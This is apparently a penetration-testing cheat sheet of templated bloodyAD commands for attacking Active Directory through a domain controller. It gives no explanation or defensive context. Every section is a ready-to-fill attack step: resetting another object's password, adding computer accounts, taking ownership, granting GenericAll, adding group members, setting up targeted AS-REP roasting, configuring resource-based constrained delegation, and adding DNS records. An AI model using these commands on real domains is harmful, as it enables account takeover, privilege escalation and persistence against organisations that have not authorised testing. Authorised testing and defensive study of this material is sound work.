# bloodyad
#target/remote #os/linux #cat/ad

## Get writable
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> get writable --partition DOMAIN
```

## Set password
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> set password '<target_obj>' '<new_password|Password123!>'
```

## Add computer
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add computer '<computer_name|PENTEST>' '<new_password|Password123!>'
```

## Set owner
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> set owner '<target_obj>' <principal>
```

## Add genericAll
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add genericAll '<target_obj>' <principal>
```

## Add groupMember
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add groupMember '<target_obj>' <principal>
```

## Set object
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> set object '<target_obj>' <attribute> -v <value>
```

## Targeted ASREPROAST
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add uac '<target_obj>' -f DONT_REQ_PREAUTH
```

## Add RBCD
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add rbcd '<target_obj>' <principal>
```

## Enable account
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> remove uac '<target_obj>' -f ACCOUNTDISABLE
```

## Add DNS record
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add dnsRecord <record_name> <record_data>
```

## Abuse writeOwner
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> set owner '<target_obj>' <principal>
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add genericAll '<target_obj>' <principal>
```
